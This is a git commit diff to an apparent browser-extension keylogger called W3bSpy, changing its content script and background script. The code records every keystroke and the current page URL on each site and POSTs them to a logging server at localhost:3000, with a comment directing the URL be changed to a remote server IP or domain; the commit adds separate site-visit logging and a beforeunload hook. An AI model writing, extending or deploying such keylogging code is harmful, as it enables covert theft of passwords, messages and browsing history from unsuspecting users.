ea93e69ee9b5f47d7d9c46df2ef09f9114b95243
5pyD3R <samratdey2k21@gmail.com>
2024-04-23 23:35:19 +0530

    update

--- src/W3bSpy/W3bSpy-Client/background.js
+++ src/W3bSpy/W3bSpy-Client/background.js
@@ -1,3 +1,23 @@
+// chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
+//   if (request.type === "keystroke") {
+//     console.log("Storing keystroke: " + request.data);
+//     fetch('http://localhost:3000/log-data', {
+//       method: 'POST',
+//       headers: {
+//         'Content-Type': 'application/json'
+//       },
+//       body: JSON.stringify({ keystroke: request.data, site: request.site })
+//     });
+//   } else if (request.type === "site") {
+//     console.log("Detected site: " + request.data);
+//     // No need to fetch here, site data is already sent when keystrokes are logged
+//   }
+// });
+
+
+// fetch('http://YOUR_SERVER_IP_OR_DOMAIN:3000/log-data',  => Update this URL to work beyond localhost 
+
+
 chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
   if (request.type === "keystroke") {
     console.log("Storing keystroke: " + request.data);
@@ -10,9 +30,13 @@ chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
     });
   } else if (request.type === "site") {
     console.log("Detected site: " + request.data);
-    // No need to fetch here, site data is already sent when keystrokes are logged
+    // If no keystrokes were sent with the site information, set the keystroke field value to null
+    fetch('http://localhost:3000/log-data', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({ keystroke: null, site: request.data })
+    });
   }
 });
-
-
-// fetch('http://YOUR_SERVER_IP_OR_DOMAIN:3000/log-data',  => Update this URL to work beyond localhost 
--- src/W3bSpy/W3bSpy-Client/content.js
+++ src/W3bSpy/W3bSpy-Client/content.js
@@ -1,6 +1,20 @@
+// document.addEventListener("keydown", function(event) {
+//   chrome.runtime.sendMessage({ type: "keystroke", data: event.key, site: location.href });
+// });
+
+// // Send site information separately
+// chrome.runtime.sendMessage({ type: "site", data: location.href });
+
+
+// Send site information when the content script is injected
+chrome.runtime.sendMessage({ type: "site", data: location.href });
+
+// Listen for keystroke events
 document.addEventListener("keydown", function(event) {
   chrome.runtime.sendMessage({ type: "keystroke", data: event.key, site: location.href });
 });
 
-// Send site information separately
-chrome.runtime.sendMessage({ type: "site", data: location.href });
+// Listen for page navigation events to ensure site information is sent reliably
+window.addEventListener("beforeunload", function() {
+  chrome.runtime.sendMessage({ type: "site", data: location.href });
+});
